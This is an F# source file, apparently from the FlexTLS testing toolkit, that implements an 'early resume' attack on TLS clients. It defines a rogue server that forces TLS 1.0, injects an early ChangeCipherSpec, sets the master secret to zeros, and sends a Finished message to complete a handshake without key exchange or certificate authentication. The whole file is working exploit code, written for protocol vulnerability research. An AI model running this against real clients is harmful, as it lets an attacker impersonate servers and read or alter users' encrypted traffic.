#light "off"

module FlexApps.Attack_EarlyResume

open Bytes
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexRecord
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexHandshake




type Attack_EarlyResume =
    class

    static member run (cn:string, ?port:int) : state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Accept TCP connection from client
        let st,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",cn,port) in

        let st,nsc,fch = FlexClientHello.receive(st) in
        let fsh = {FlexConstants.nullFServerHello with
                   pv=Some(TLS_1p0); ciphersuite=Some(TLS_RSA_WITH_AES_128_CBC_SHA)} in
        let st,nsc,fsh = FlexServerHello.send(st,fch,nsc,fsh) in

        // Inject early CCS and start encrypting early
        let st,_         = FlexCCS.send(st) in

        // We fill the master secret with zeros because it has no data from the KEX yet
        // Then we compute and install the writing keys
        let epk = { nsc.keys with ms = (Bytes.createBytes 48 0)} in
        let nsc = { nsc with keys = epk} in
        let nsc = FlexSecrets.fillSecrets(st,Server,nsc) in
        let st  = FlexState.installWriteKeys st nsc in

        let log          = fch.payload @| fsh.payload in
        let st,ffS       = FlexFinished.send(st,nsc,logRole=(log,Server)) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nsc in

        let log          = log @| ffS.payload in
        let st,ffC       = FlexFinished.receive(st,nsc,(log,Client)) in
        st

    end


